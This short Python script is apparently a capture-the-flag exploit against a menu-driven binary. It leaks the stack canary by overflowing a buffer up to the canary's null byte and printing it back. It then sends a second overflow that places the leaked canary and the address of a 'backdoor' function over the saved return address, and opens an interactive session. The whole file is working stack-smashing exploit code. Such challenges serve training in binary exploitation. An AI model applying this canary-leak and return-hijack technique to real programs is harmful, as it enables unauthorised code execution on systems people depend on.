#!/usr/bin/python
# -*- coding: UTF-8 -*-

from base import *

ru(b'your choice: ')
sl(b'1')
sl(b'a' * 0x17 + b'b')
ru(b'your choice: ')
sl(b'2')
ru(b'b\n')
canary = u64(rc(7).rjust(8, b'\x00'))
info('canary: ', canary)
backdoor = elf.symbols['backdoor']
sl(b'1')
payload = b'a' * 0x18 + p64(canary) + b'b' * 8 + p64(backdoor)
sl(payload)
sl(b'3')
ia()
